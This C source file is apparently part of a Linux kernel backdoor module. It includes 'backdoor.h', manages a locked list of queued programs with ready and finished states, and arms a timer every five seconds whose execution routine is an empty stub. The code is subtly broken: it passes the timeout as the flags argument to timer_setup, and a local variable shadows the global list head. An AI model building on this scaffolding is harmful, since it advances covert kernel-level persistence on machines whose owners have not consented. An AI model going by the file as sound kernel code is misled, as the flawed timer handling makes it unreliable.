#include <linux/rculist.h>
#include <linux/timer.h>
#include "backdoor.h"

DEFINE_SPINLOCK(listmutex);

struct timer_list timer;
program_list *head;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,15,0)
void execute_ready_programs(struct timer_list *tl){
	

	create_timer(5);
}
#else
void execute_ready_programs(unsigned long data){
	create_timer(5);
}
#endif

program_list *init_program(void){
	program_list *head = kmalloc(sizeof(struct program_list), GFP_KERNEL);
	memset(head, 0, sizeof(struct program_list));	
	INIT_LIST_HEAD(&(head->prog_list));
	return head;
}

int status(program_list *head){
	program_list *entry;

	rcu_read_lock();
	list_for_each_entry_rcu(entry, &(head->prog_list), prog_list) {
		if(entry->state == FINISHED) {
			rcu_read_unlock();
			return FINISHED;
		}
	}
	rcu_read_unlock();

	return READY;
}

void state_add(program_list **head, short int state, void *buffer, unsigned int length){
	program_list *entry = init_program();

	entry->state = state;
	entry->buffer = buffer;
	entry->length = length;

	spin_lock(&listmutex);
	list_add_rcu(&(entry->prog_list), &((*head)->prog_list));
	spin_unlock(&listmutex);
}

void create_timer(unsigned long timeout){
	/* https://lkml.org/lkml/2017/11/25/90 */
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,15,0)
		timer_setup(&timer, execute_ready_programs, timeout);
	#else
		setup_timer(&timer, execute_ready_programs, timeout);
	#endif
	
	mod_timer(&timer, jiffies + msecs_to_jiffies(timeout * 1000));
}

void destroy_timer(void){
	del_timer(&timer);
}
